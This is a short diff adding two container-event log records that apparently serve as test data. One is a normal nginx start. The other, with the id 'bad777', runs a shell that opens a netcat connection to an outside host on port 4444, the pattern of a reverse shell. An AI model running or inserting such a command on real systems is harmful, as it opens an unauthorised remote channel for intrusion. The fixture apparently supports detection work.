@@ -1,0 +1,2 @@
+{"seq":7000,"ts":"2026-06-10T02:31:00Z","host":"web-2","id":"5eac1d","image":"nginx:stable","command":"nginx -g daemon off;"}
+{"seq":7001,"ts":"2026-06-10T02:32:10Z","host":"web-2","id":"bad777","image":"alpine:3.19","command":"/bin/sh -c nc 198.51.100.77 4444"}
